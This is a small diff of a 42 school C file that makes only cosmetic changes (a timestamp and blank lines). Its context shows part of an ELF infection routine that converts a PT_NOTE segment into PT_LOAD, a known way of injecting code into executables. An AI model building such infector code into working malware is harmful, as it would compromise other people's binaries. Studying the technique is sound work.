@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:22:03 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/12 20:34:03 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/13 14:31:59 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -15,7 +15,6 @@
 /*
   Infect() modify binary header and segment. it transform PT_NOTE into PT_LOAD
 */
-
 __INLINE__ static Elf64_Phdr	*get_segment(t_data *data, register int off)
 {
 	Elf64_Phdr *ret;
@@ -52,7 +51,6 @@ void	infect(t_data *data)
 	Elf64_Phdr  *tmp = NULL;
 	for (register int off = 0 ; off < data->header->e_phnum ; off++)
 	{
-
 		if (!(tmp = get_segment(data, off)))
 			goto next;
 		if (is_ptnote(tmp) == true)
